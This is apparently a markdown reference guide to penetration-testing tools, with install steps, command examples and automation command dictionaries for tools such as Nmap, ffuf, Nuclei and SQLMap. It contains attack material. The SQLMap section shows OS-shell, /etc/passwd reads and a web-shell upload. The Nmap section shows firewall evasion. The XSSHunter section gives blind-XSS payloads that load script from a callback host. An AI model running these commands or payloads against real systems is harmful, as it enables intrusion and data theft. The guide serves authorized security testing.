# Security Tools Arsenal - Comprehensive Reference Guide

## 📋 Overview

A curated collection of essential security testing, fuzzing, and vulnerability assessment tools used by penetration testers, bug bounty hunters, and security researchers. This reference guide provides installation instructions, usage examples, and integration patterns for industry-standard security tools.

## 🎯 Purpose

Security professionals need to master multiple tools to effectively identify and exploit vulnerabilities. This guide consolidates:
- **Installation instructions** - Get tools running quickly
- **Usage examples** - Learn practical applications
- **Integration patterns** - Chain tools together effectively
- **Best practices** - Use tools ethically and efficiently
- **Payload management** - Leverage wordlists and fuzzing inputs

## 🛠️ Tools Included

### Alphabetical Tool Index

1. [AFL++](#afl) - Advanced fuzzing framework
2. [Arjun](#arjun) - HTTP parameter discovery
3. [Burp Suite](#burp-suite) - Web application security testing
4. [Ffuf](#ffuf) - Fast web fuzzer
5. [Honggfuzz](#honggfuzz) - Security-oriented fuzzer
6. [Kali Linux](#kali-linux) - Penetration testing distribution
7. [LibFuzzer](#libfuzzer) - In-process coverage-guided fuzzer
8. [Nmap](#nmap) - Network discovery and security auditing
9. [Nuclei](#nuclei) - Fast vulnerability scanner based on templates
10. [SQLMap](#sqlmap) - Automatic SQL injection exploitation
11. [Wireshark](#wireshark) - Network protocol analyzer
12. [XSSHunter](#xsshunter) - Blind XSS discovery

---

## 🔧 Tool Details

### AFL++

**Description:** AFL++ is an advanced fork of AFL (American Fuzzy Lop) that provides coverage-guided fuzzing for finding security vulnerabilities through intelligent mutation-based testing.

**Use Cases:**
- Binary fuzzing for memory corruption bugs
- Protocol fuzzing
- File format fuzzing
- Finding crashes and hangs in compiled software

**Installation:**

```bash
# Linux (Ubuntu/Debian)
sudo apt-get update
sudo apt-get install afl++

# From source
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make
sudo make install

# Verify installation
afl-fuzz --version
```

**Basic Usage:**

```bash
# Compile target with AFL instrumentation
afl-gcc -o target target.c

# Create input/output directories
mkdir input output
echo "sample" > input/sample.txt

# Run fuzzer
afl-fuzz -i input -o output -- ./target @@

# Monitor fuzzing with afl-whatsup
afl-whatsup output/
```

**Advanced Examples:**

```bash
# Parallel fuzzing with multiple cores
afl-fuzz -i input -o output -M fuzzer1 -- ./target @@
afl-fuzz -i input -o output -S fuzzer2 -- ./target @@
afl-fuzz -i input -o output -S fuzzer3 -- ./target @@

# Dictionary-based fuzzing
afl-fuzz -i input -o output -x dict.txt -- ./target @@

# Network fuzzing with AFL++
afl-fuzz -i input -o output -N tcp://127.0.0.1:8080 -- ./server
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "AFL++ Fuzzing Campaign": r'afl-fuzz -i "C:\payloads\afl-inputs" -o "C:\output\afl-results" -t 5000 -- target.exe @@',
}
```

---

### Arjun

**Description:** Arjun is an HTTP parameter discovery tool that finds query parameters for URL endpoints, useful for discovering hidden API parameters and attack surface expansion.

**Use Cases:**
- API parameter discovery
- Hidden parameter enumeration
- Attack surface mapping
- Pre-exploitation reconnaissance

**Installation:**

```bash
# Using pip
pip install arjun

# From source
git clone https://github.com/s0md3v/Arjun.git
cd Arjun
pip install -r requirements.txt

# Verify installation
arjun --help
```

**Basic Usage:**

```bash
# Single URL parameter discovery
arjun -u https://target.com/api/endpoint

# Multiple URLs from file
arjun -i urls.txt

# With custom wordlist
arjun -u https://target.com/api/endpoint -w wordlist.txt

# Output to JSON
arjun -u https://target.com/api/endpoint -oJ output.json
```

**Advanced Examples:**

```bash
# GET parameter discovery with custom headers
arjun -u https://target.com/api/users -m GET -H "Authorization: Bearer token123"

# POST parameter discovery
arjun -u https://target.com/api/login -m POST

# Passive mode (using wayback machine)
arjun -u https://target.com --passive

# Multi-threaded scanning
arjun -u https://target.com -t 10

# With rate limiting
arjun -u https://target.com --stable
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "Arjun Parameter Discovery": r'arjun -u "https://target.com/api/endpoint" -w "C:\payloads\parameters\arjun-params.txt" -oJ "C:\output\arjun-results.json"',
    
    "Arjun Bulk URL Scan": r'arjun -i "C:\output\domain_output.txt" -oJ "C:\output\arjun-bulk.json"',
}
```

---

### Burp Suite

**Description:** Burp Suite is an integrated platform for web application security testing, providing tools for mapping attack surfaces, analyzing requests, and finding vulnerabilities through manual and automated testing.

**Use Cases:**
- Web application penetration testing
- HTTP/HTTPS traffic interception
- Manual vulnerability testing
- Automated scanning (Professional version)
- API testing

**Installation:**

```bash
# Download from official website
# https://portswigger.net/burp/communitydownload

# Community Edition (Free)
# Download .jar or installer for your platform

# Professional Edition (Paid)
# Requires license key

# Linux installation
chmod +x burpsuite_community_linux.sh
./burpsuite_community_linux.sh

# Windows
# Run the .exe installer
```

**Basic Usage:**

**1. Proxy Configuration:**
```
1. Open Burp Suite
2. Go to Proxy → Options
3. Set proxy listener to 127.0.0.1:8080
4. Configure browser to use proxy 127.0.0.1:8080
5. Visit http://burp in browser to download CA certificate
6. Install CA certificate in browser
```

**2. Intercept Traffic:**
```
1. Proxy → Intercept → Turn intercept on
2. Browse to target website
3. View/modify requests in Burp
4. Forward or drop requests
```

**3. Active Scanning:**
```
1. Send request to Scanner (right-click → Send to Scanner)
2. Configure scan settings
3. Review scan results in Target → Site map
```

**Advanced Examples:**

**Intruder Attack:**
```
1. Send request to Intruder
2. Position payload markers §§
3. Configure payload options
4. Start attack
5. Analyze results sorted by status/length
```

**Repeater Testing:**
```
1. Send request to Repeater
2. Modify parameters/headers
3. Click Send to see response
4. Compare responses
```

**Collaborator Testing:**
```
1. Insert Burp Collaborator payload
2. Poll for interactions
3. Detect out-of-band vulnerabilities (SSRF, XXE, etc.)
```

**Integration with Workflow Automation:**

```python
# Burp typically used interactively, but can proxy other tools
scanner_commands = {
    "Ffuf via Burp Proxy": r'ffuf -w "C:\payloads\directories\common.txt" -u "https://target.com/FUZZ" -x http://127.0.0.1:8080',
    
    "SQLMap via Burp Proxy": r'sqlmap -u "https://target.com/product?id=1" --proxy="http://127.0.0.1:8080" --batch',
}
```

---

### Ffuf

**Description:** Ffuf (Fuzz Faster U Fool) is a fast web fuzzer written in Go, designed for content discovery, parameter fuzzing, and vulnerability testing through wordlist-based attacks.

**Use Cases:**
- Directory and file discovery
- Virtual host discovery
- Parameter fuzzing (GET/POST)
- Subdomain enumeration
- API endpoint discovery

**Installation:**

```bash
# Using go install
go install github.com/ffuf/ffuf@latest

# From source
git clone https://github.com/ffuf/ffuf
cd ffuf
go build

# Pre-compiled binaries
# Download from https://github.com/ffuf/ffuf/releases

# Verify installation
ffuf -V
```

**Basic Usage:**

```bash
# Directory discovery
ffuf -w wordlist.txt -u https://target.com/FUZZ

# With specific status code filtering
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302

# Parameter discovery (GET)
ffuf -w params.txt -u https://target.com/search?FUZZ=test

# Parameter discovery (POST)
ffuf -w params.txt -u https://target.com/login -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded"
```

**Advanced Examples:**

```bash
# Virtual host discovery
ffuf -w vhosts.txt -u https://target.com -H "Host: FUZZ.target.com" -mc 200

# Multiple wordlists with keywords
ffuf -w dirs.txt:DIRS -w files.txt:FILES -u https://target.com/DIRS/FILES

# Recursive fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 2

# Output to JSON
ffuf -w wordlist.txt -u https://target.com/FUZZ -o results.json -of json

# Rate limiting
ffuf -w wordlist.txt -u https://target.com/FUZZ -rate 10

# Filtering by response size
ffuf -w wordlist.txt -u https://target.com/FUZZ -fs 4242

# Filtering by word count
ffuf -w wordlist.txt -u https://target.com/FUZZ -fw 97

# Regex matching
ffuf -w wordlist.txt -u https://target.com/FUZZ -mr "admin|login|dashboard"

# Custom headers and cookies
ffuf -w wordlist.txt -u https://target.com/FUZZ -H "Authorization: Bearer token123" -b "session=abc123"

# Through proxy (Burp Suite)
ffuf -w wordlist.txt -u https://target.com/FUZZ -x http://127.0.0.1:8080
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "Ffuf Directory Discovery": r'ffuf -w "C:\payloads\directories\common.txt" -u "https://target.com/FUZZ" -mc 200,301,302,403 -o "C:\output\ffuf-dirs.json" -of json',
    
    "Ffuf Parameter Discovery": r'ffuf -w "C:\payloads\parameters\common-params.txt" -u "https://target.com/search?FUZZ=test" -mc 200,400 -o "C:\output\ffuf-params.json" -of json',
    
    "Ffuf Vhost Discovery": r'ffuf -w "C:\payloads\dns\subdomains-10000.txt" -u "https://target.com" -H "Host: FUZZ.target.com" -mc 200,301,302',
    
    "Ffuf XSS Fuzzing": r'ffuf -w "C:\payloads\fuzzing\xss-payloads.txt" -u "https://target.com/search?q=FUZZ" -mc 200 -mr "<script|onerror|onload"',
}
```

---

### Honggfuzz

**Description:** Honggfuzz is a security-oriented fuzzer with powerful analysis options, supporting evolutionary, feedback-driven fuzzing based on code coverage.

**Use Cases:**
- Binary fuzzing
- Kernel fuzzing
- Network protocol fuzzing
- Finding memory corruption bugs
- Persistent fuzzing campaigns

**Installation:**

```bash
# Linux (Ubuntu/Debian)
sudo apt-get install honggfuzz

# From source
git clone https://github.com/google/honggfuzz
cd honggfuzz
make
sudo make install

# Verify installation
honggfuzz --version
```

**Basic Usage:**

```bash
# Compile target with honggfuzz instrumentation
hfuzz-gcc target.c -o target

# Basic fuzzing
honggfuzz -i input/ -o output/ -- ./target ___FILE___

# With sanitizers (ASAN)
hfuzz-clang -fsanitize=address target.c -o target
honggfuzz -i input/ -o output/ -- ./target ___FILE___
```

**Advanced Examples:**

```bash
# Persistent fuzzing (faster)
honggfuzz -i input/ -o output/ -P -- ./target

# Network fuzzing
honggfuzz -i input/ -o output/ -s -- ./server

# With dictionary
honggfuzz -i input/ -o output/ -w dict.txt -- ./target ___FILE___

# Multiple threads
honggfuzz -i input/ -o output/ -n 8 -- ./target ___FILE___

# Minimize corpus
honggfuzz -i input/ -o minimized/ -M -- ./target ___FILE___
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "Honggfuzz Campaign": r'honggfuzz -i "C:\payloads\honggfuzz-inputs" -o "C:\output\honggfuzz-crashes" -n 4 -- target.exe ___FILE___',
}
```

---

### Kali Linux

**Description:** Kali Linux is a Debian-based Linux distribution designed for penetration testing and security auditing, pre-loaded with hundreds of security tools.

**Use Cases:**
- Penetration testing
- Digital forensics
- Security research
- Vulnerability assessment
- Wireless network testing

**Installation:**

```bash
# Download ISO from official website
# https://www.kali.org/downloads/

# Installation options:
# 1. Bare metal installation
# 2. Virtual machine (VMware/VirtualBox)
# 3. Windows Subsystem for Linux (WSL)
# 4. Docker container
# 5. Live USB

# WSL Installation (Windows 10/11)
# 1. Enable WSL:
wsl --install

# 2. Install from Microsoft Store or:
wsl --install -d kali-linux

# 3. Launch Kali
kali

# 4. Update system
sudo apt update && sudo apt upgrade -y

# Docker Installation
docker pull kalilinux/kali-rolling
docker run -it kalilinux/kali-rolling /bin/bash
```

**Basic Usage:**

```bash
# Update Kali
sudo apt update && sudo apt full-upgrade -y

# Install metapackages
sudo apt install kali-linux-default  # Default tools
sudo apt install kali-tools-top10    # Top 10 tools
sudo apt install kali-linux-large    # Large tool set
sudo apt install kali-linux-everything  # Everything

# Search for tools
apt search <tool-name>

# Install specific tool
sudo apt install <tool-name>
```

**Pre-installed Tools (Examples):**

```bash
# Network scanning
nmap -sV -sC target.com

# Web application testing
nikto -h https://target.com

# Password cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Wireless testing
aircrack-ng -w wordlist capture.cap

# Exploitation
msfconsole

# Social engineering
setoolkit
```

**Advanced Examples:**

```bash
# Create custom Kali ISO
apt install live-build

# Kali with custom tools
git clone https://gitlab.com/kalilinux/build-scripts/live-build-config
cd live-build-config
# Customize build

# Update all tools
sudo apt update && sudo apt full-upgrade -y
```

**Integration with Workflow Automation:**

```python
# Workflow Automation can run on Kali Linux
# Simply ensure paths are Linux-compatible

scanner_commands = {
    "Nmap Scan": r'nmap -sV -sC -p- --open -iL "/home/kali/output/domain_output.txt"',
    
    "Nikto Web Scan": r'nikto -h https://target.com -o "/home/kali/output/nikto_results.txt"',
    
    "SQLMap Injection": r'sqlmap -u "https://target.com/product?id=1" --batch -o "/home/kali/output/sqlmap_results.txt"',
    
    "Nuclei Scan": r'nuclei -l "/home/kali/output/domain_output.txt" -t cves/ -o "/home/kali/output/nuclei_results.txt"',
}
```

---

### LibFuzzer

**Description:** LibFuzzer is an in-process, coverage-guided, evolutionary fuzzing engine that is part of the LLVM project, designed for fuzzing libraries and APIs.

**Use Cases:**
- Library fuzzing
- API fuzzing
- In-process fuzzing
- Continuous integration fuzzing
- Finding memory corruption bugs

**Installation:**

```bash
# Comes with Clang/LLVM
# Install Clang
sudo apt-get install clang

# Verify LibFuzzer availability
clang -v | grep libFuzzer
```

**Basic Usage:**

```bash
# Create fuzz target
cat > fuzz_target.cpp << 'EOF'
#include <stdint.h>
#include <stddef.h>

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  // Your code to test
  if (Size > 0 && Data[0] == 'H') {
    if (Size > 1 && Data[1] == 'I') {
      if (Size > 2 && Data[2] == '!') {
        __builtin_trap(); // Simulate crash
      }
    }
  }
  return 0;
}
EOF

# Compile with LibFuzzer
clang++ -g -O1 -fsanitize=fuzzer,address fuzz_target.cpp -o fuzz_target

# Run fuzzer
./fuzz_target

# With corpus directory
./fuzz_target corpus/

# With dictionary
./fuzz_target -dict=dict.txt corpus/
```

**Advanced Examples:**

```bash
# Minimize corpus
./fuzz_target -merge=1 minimized_corpus/ corpus/

# Run with timeout
./fuzz_target -timeout=5

# Maximum input length
./fuzz_target -max_len=1024

# Number of runs
./fuzz_target -runs=1000000

# Use multiple workers
./fuzz_target -workers=8 -jobs=8

# With sanitizers
clang++ -g -O1 -fsanitize=fuzzer,address,undefined fuzz_target.cpp -o fuzz_target

# Continuous fuzzing with coverage
./fuzz_target -print_coverage=1 corpus/
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "LibFuzzer Campaign": r'./fuzz_target -max_total_time=3600 -workers=4 "C:\payloads\libfuzzer-corpus"',
}
```

---

### Nmap

**Description:** Nmap (Network Mapper) is a free and open-source network scanner used for network discovery, security auditing, and port scanning.

**Use Cases:**
- Network discovery
- Port scanning
- Service/version detection
- OS detection
- Vulnerability scanning with NSE scripts

**Installation:**

```bash
# Linux (Ubuntu/Debian)
sudo apt-get install nmap

# macOS
brew install nmap

# Windows
# Download from https://nmap.org/download.html

# Verify installation
nmap --version
```

**Basic Usage:**

```bash
# Basic port scan
nmap target.com

# Scan specific ports
nmap -p 80,443 target.com

# Scan port range
nmap -p 1-1000 target.com

# Scan all ports
nmap -p- target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A target.com
```

**Advanced Examples:**

```bash
# TCP SYN scan (stealth scan)
sudo nmap -sS target.com

# UDP scan
sudo nmap -sU target.com

# Fast scan (top 100 ports)
nmap -F target.com

# Scan from file
nmap -iL targets.txt

# Output formats
nmap -oN output.txt target.com  # Normal
nmap -oX output.xml target.com  # XML
nmap -oG output.gnmap target.com  # Grepable
nmap -oA output target.com  # All formats

# NSE scripts (vulnerability scanning)
nmap --script vuln target.com
nmap --script http-sql-injection target.com
nmap --script ssl-cert,ssl-enum-ciphers target.com

# DNS brute-force
nmap --script dns-brute target.com

# With custom wordlist
nmap --script dns-brute --script-args dns-brute.hostlist=wordlist.txt target.com

# Rate limiting
nmap --max-rate 10 target.com
nmap --scan-delay 1s target.com

# Timing templates
nmap -T0 target.com  # Paranoid (slowest)
nmap -T3 target.com  # Normal (default)
nmap -T5 target.com  # Insane (fastest)

# Evade firewalls
nmap -f target.com  # Fragment packets
nmap -D RND:10 target.com  # Decoy scans
nmap --source-port 53 target.com  # Spoof source port

# IPv6 scanning
nmap -6 target.com
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "Nmap Full Port Scan": r'nmap -p 1-65535 --open --max-rate 5/s -iL "C:\output\domain_output.txt" -oA "C:\output\nmap-full"',
    
    "Nmap Service Detection": r'nmap -sV -sC -p- --open -iL "C:\output\domain_output.txt" -oA "C:\output\nmap-services"',
    
    "Nmap Vulnerability Scan": r'nmap --script vuln -iL "C:\output\domain_output.txt" -oN "C:\output\nmap-vulns.txt"',
    
    "Nmap DNS Bruteforce": r'nmap --script dns-brute --script-args "dns-brute.hostlist=C:\payloads\dns\subdomains-10000.txt" target.com',
}
```

---

### Nuclei

**Description:** Nuclei is a fast and customizable vulnerability scanner based on simple YAML-based templates, enabling you to scan for a wide range of security issues across technologies.

**Use Cases:**
- Automated vulnerability scanning
- CVE detection
- Misconfiguration discovery
- Exposed panel detection
- Continuous security monitoring
- CI/CD integration

**Installation:**

```bash
# Using go install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Using brew (macOS)
brew install nuclei

# Pre-compiled binaries
# Download from https://github.com/projectdiscovery/nuclei/releases

# Verify installation
nuclei -version

# Update templates
nuclei -update-templates
```

**Basic Usage:**

```bash
# Scan single URL
nuclei -u https://target.com

# Scan multiple URLs from file
nuclei -l urls.txt

# Scan with specific templates
nuclei -u https://target.com -t cves/

# Scan with severity filter
nuclei -u https://target.com -severity critical,high

# Output to file
nuclei -u https://target.com -o results.txt
```

**Advanced Examples:**

```bash
# Scan with specific tags
nuclei -u https://target.com -tags cve,oob,ssrf

# Scan with template directory
nuclei -u https://target.com -t /path/to/templates/

# Multiple targets
nuclei -l targets.txt -t cves/ -o results.txt

# Exclude specific templates
nuclei -u https://target.com -t cves/ -exclude-templates cves/2020/

# Rate limiting
nuclei -u https://target.com -rate-limit 10

# Bulk header
nuclei -l urls.txt -H "Authorization: Bearer token123"

# Retries
nuclei -u https://target.com -retries 3

# Timeout
nuclei -u https://target.com -timeout 10

# JSON output
nuclei -u https://target.com -json -o results.json

# Markdown report
nuclei -u https://target.com -markdown-export report.md

# SARIF output (for GitHub)
nuclei -u https://target.com -sarif-export results.sarif

# Silent mode (only show findings)
nuclei -u https://target.com -silent

# Verbose mode
nuclei -u https://target.com -v

# Debug mode
nuclei -u https://target.com -debug

# Scan with multiple severity levels
nuclei -u https://target.com -severity critical,high,medium

# Scan specific protocols
nuclei -u https://target.com -t http/

# Scan for exposed panels
nuclei -u https://target.com -tags panel

# Scan for default credentials
nuclei -u https://target.com -tags default-login

# Scan with custom headers
nuclei -u https://target.com -H "Cookie: session=abc123" -H "User-Agent: Custom"

# Scan with proxy
nuclei -u https://target.com -proxy-url http://127.0.0.1:8080

# Automatic template execution
nuclei -u https://target.com -automatic-scan

# Resume scan
nuclei -l urls.txt -resume resume.cfg

# Statistics
nuclei -u https://target.com -stats

# Scan with webhooks (Slack/Discord)
nuclei -u https://target.com -webhook-url https://hooks.slack.com/services/YOUR/WEBHOOK/URL

# Interactsh integration for OOB detection
nuclei -u https://target.com -interactions
```

**Template Categories:**

```bash
# CVE templates
nuclei -u https://target.com -t cves/

# Exposed panels
nuclei -u https://target.com -t exposed-panels/

# Misconfigurations
nuclei -u https://target.com -t misconfigurations/

# Default credentials
nuclei -u https://target.com -t default-logins/

# DNS templates
nuclei -u https://target.com -t dns/

# Fuzzing templates
nuclei -u https://target.com -t fuzzing/

# Technologies
nuclei -u https://target.com -t technologies/

# Takeovers
nuclei -u https://target.com -t takeovers/

# WordPress
nuclei -u https://target.com -t wordpress/

# Joomla
nuclei -u https://target.com -t joomla/
```

**Custom Template Example:**

```yaml
# custom-xss-check.yaml
id: custom-xss-check

info:
  name: Custom XSS Detection
  author: yourname
  severity: high
  description: Detects reflected XSS vulnerabilities
  tags: xss,custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}/search?q={{randstr}}"
    
    matchers:
      - type: word
        words:
          - "{{randstr}}"
        part: body
      
      - type: word
        words:
          - "text/html"
        part: header
```

**Running Custom Template:**

```bash
nuclei -u https://target.com -t custom-xss-check.yaml
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "Nuclei CVE Scan": r'nuclei -l "C:\output\domain_output.txt" -t cves/ -severity critical,high -o "C:\output\nuclei-cves.txt"',
    
    "Nuclei Full Scan": r'nuclei -l "C:\output\domain_output.txt" -t nuclei-templates/ -o "C:\output\nuclei-full.txt"',
    
    "Nuclei Exposed Panels": r'nuclei -l "C:\output\domain_output.txt" -t exposed-panels/ -o "C:\output\nuclei-panels.txt"',
    
    "Nuclei Misconfigurations": r'nuclei -l "C:\output\domain_output.txt" -t misconfigurations/ -o "C:\output\nuclei-misconfig.txt"',
    
    "Nuclei JSON Output": r'nuclei -l "C:\output\domain_output.txt" -t cves/ -json -o "C:\output\nuclei-results.json"',
    
    "Nuclei with Interactsh": r'nuclei -l "C:\output\domain_output.txt" -t cves/ -interactions -o "C:\output\nuclei-oob.txt"',
}
```

**Nuclei Template Repositories:**

```bash
# Official templates (auto-updated)
nuclei -update-templates

# Custom template repositories
nuclei -u https://target.com -t https://github.com/your-org/custom-templates

# Local custom templates
nuclei -u https://target.com -t /path/to/custom/templates/
```

---

### SQLMap

**Description:** SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities.

**Use Cases:**
- SQL injection detection
- Database fingerprinting
- Data extraction
- Database takeover
- File system access via SQL injection

**Installation:**

```bash
# Linux (Ubuntu/Debian)
sudo apt-get install sqlmap

# Using pip
pip install sqlmap

# From source
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py

# Verify installation
sqlmap --version
```

**Basic Usage:**

```bash
# Basic SQL injection test
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Test specific parameter
sqlmap -u "http://target.com/page?id=1&name=test" -p id

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# Get current user
sqlmap -u "http://target.com/page?id=1" --current-user

# Get current database
sqlmap -u "http://target.com/page?id=1" --current-db
```

**Advanced Examples:**

```bash
# Batch mode (non-interactive)
sqlmap -u "http://target.com/page?id=1" --batch

# Risk and level
sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5

# Through proxy (Burp Suite)
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# From Burp request file
sqlmap -r request.txt

# Tamper scripts (WAF bypass)
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase,space2comment

# OS shell access
sqlmap -u "http://target.com/page?id=1" --os-shell

# Read file
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Crawl website and test all forms
sqlmap -u "http://target.com" --crawl=3 --batch

# Mobile user-agent
sqlmap -u "http://target.com/page?id=1" --mobile

# Random user-agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Custom user-agent
sqlmap -u "http://target.com/page?id=1" --user-agent="Custom Agent"

# Threads for faster execution
sqlmap -u "http://target.com/page?id=1" --threads=10

# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Technique specification
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "SQLMap Basic Test": r'sqlmap -u "https://target.com/product?id=1" --batch --risk=3 --level=5 -o "C:\output\sqlmap_basic.txt"',
    
    "SQLMap via Burp": r'sqlmap -u "https://target.com/product?id=1" --proxy="http://127.0.0.1:8080" --batch -o "C:\output\sqlmap_burp.txt"',
    
    "SQLMap Database Enumeration": r'sqlmap -u "https://target.com/product?id=1" --batch --dbs -o "C:\output\sqlmap_dbs.txt"',
    
    "SQLMap Crawl and Test": r'sqlmap -u "https://target.com" --crawl=2 --batch --forms -o "C:\output\sqlmap_crawl.txt"',
}
```

---

### Wireshark

**Description:** Wireshark is the world's most popular network protocol analyzer, allowing you to capture and interactively browse network traffic.

**Use Cases:**
- Network troubleshooting
- Security analysis
- Protocol development
- Traffic analysis
- Malware analysis

**Installation:**

```bash
# Linux (Ubuntu/Debian)
sudo apt-get install wireshark

# Add user to wireshark group (optional, for non-root capture)
sudo usermod -aG wireshark $USER
# Log out and back in

# macOS
brew install wireshark

# Windows
# Download from https://www.wireshark.org/download.html

# Verify installation
wireshark --version
tshark --version  # Command-line version
```

**Basic Usage (GUI):**

```
1. Launch Wireshark
2. Select network interface
3. Click Start Capturing
4. Apply display filters
5. Analyze packets
6. Stop capture
7. Save capture file
```

**Command-Line Usage (tshark):**

```bash
# List interfaces
tshark -D

# Capture on specific interface
sudo tshark -i eth0

# Capture and save to file
sudo tshark -i eth0 -w capture.pcap

# Capture with filter
sudo tshark -i eth0 -f "port 80"

# Read from capture file
tshark -r capture.pcap

# Display specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port
```

**Advanced Examples:**

```bash
# Capture only HTTP traffic
sudo tshark -i eth0 -f "tcp port 80"

# Capture HTTPS traffic
sudo tshark -i eth0 -f "tcp port 443"

# Display filter (after capture)
tshark -r capture.pcap -Y "http.request"
tshark -r capture.pcap -Y "dns"
tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0"

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects/

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# Statistics
tshark -r capture.pcap -z io,stat,1  # IO statistics
tshark -r capture.pcap -z conv,tcp  # TCP conversations
tshark -r capture.pcap -z endpoints,tcp  # TCP endpoints

# Decrypt SSL/TLS (with key log file)
tshark -r capture.pcap -o "tls.keylog_file:sslkeylog.txt" -Y "http"

# Export to CSV
tshark -r capture.pcap -T fields -E header=y -E separator=, -e frame.time -e ip.src -e ip.dst > output.csv

# Capture for specific duration
sudo tshark -i eth0 -a duration:60 -w capture.pcap

# Capture specific number of packets
sudo tshark -i eth0 -c 1000 -w capture.pcap

# Ring buffer (multiple files)
sudo tshark -i eth0 -b filesize:100000 -b files:5 -w capture.pcap
```

**Common Display Filters:**

```
# HTTP
http
http.request.method == "POST"
http.request.uri contains "login"

# DNS
dns
dns.qry.name contains "google.com"

# TCP
tcp.port == 80
tcp.flags.syn == 1

# IP
ip.addr == 192.168.1.1
ip.src == 10.0.0.1

# Follow specific stream
tcp.stream eq 0

# Search for string
frame contains "password"
```

**Integration with Workflow Automation:**

```python
scanner_commands = {
    "Wireshark Capture HTTP": r'tshark -i eth0 -f "tcp port 80" -a duration:300 -w "C:\output\http_capture.pcap"',
    
    "Wireshark Capture All": r'tshark -i eth0 -a duration:600 -w "C:\output\full_capture.pcap"',
    
    "Wireshark Extract HTTP Objects": r'tshark -r "C:\output\capture.pcap" --export-objects http,"C:\output\http_objects"',
}
```

---

### XSSHunter

**Description:** XSSHunter is a service designed to find blind XSS vulnerabilities by providing a unique payload that calls back to a server when executed.

**Use Cases:**
- Blind XSS discovery
- Out-of-band XSS detection
- DOM-based XSS
- Stored XSS in admin panels
- XSS in logs/reports

**Installation:**

```bash
# XSSHunter Express (self-hosted)
git clone https://github.com/mandatoryprogrammer/xsshunter-express
cd xsshunter-express

# Configure
cp .env.example .env
# Edit .env with your settings

# Using Docker
docker-compose up -d

# Manual installation
npm install
node server.js

# Public service (deprecated, self-hosting recommended)
# Use xsshunter.com alternatives or self-host
```

**Basic Usage:**

```bash
# 1. Register account on XSSHunter instance
# 2. Get your unique XSS payload
# 3. Inject payload in target application
# 4. Wait for callback when XSS executes
# 5. Review collected data in dashboard
```

**Example Payloads:**

```html
<!-- Basic payload -->
<script src="https://your-xsshunter.com/uniqueid"></script>

<!-- Image tag payload -->
<img src=x onerror="var s=document.createElement('script');s.src='https://your-xsshunter.com/uniqueid';document.body.appendChild(s)">

<!-- SVG payload -->
<svg onload="var s=document.createElement('script');s.src='https://your-xsshunter.com/uniqueid';document.body.appendChild(s)">

<!-- Polyglot payload -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Advanced Examples:**

```bash
# Test in user profile fields
First Name: <script src="https://your-xsshunter.com/id"></script>
Last Name: Normal Name
Bio: <img src=x onerror='fetch("https://your-xsshunter.com/id")'>

# Test in support tickets
Subject: Test
Message: <script src="https://your-xsshunter.com/id"></script>

# Test in file uploads (SVG)
<svg xmlns="http://www.w3.org/2000/svg" onload="var s=document.createElement('script');s.src='https://your-xsshunter.com/id';document.body.appendChild(s)">

# Test in JSON API
{"name":"<script src=https://your-xsshunter.com/id></script>"}

# Test in headers
User-Agent: <script src="https://your-xsshunter.com/id"></script>
Referer: https://attacker.com"><script src="https://your-xsshunter.com/id"></script>
```

**Integration with Workflow Automation:**

```python
# XSSHunter typically used manually
# But you can integrate payload injection with automated tools

scanner_commands = {
    "XSS Parameter Injection": r'ffuf -w "C:\payloads\parameters\xss-params.txt" -u "https://target.com/search?FUZZ=<script src=https://your-xsshunter.com/id></script>" -mc 200',
}
```

---

## 📦 Wordlist & Payload Resources

### Essential Wordlist Collections

**SecLists (Most Comprehensive)**
```bash
git clone https://github.com/danielmiessler/SecLists.git
```
- Discovery wordlists (DNS, directories, files)
- Fuzzing payloads (XSS, SQLi, LFI, etc.)
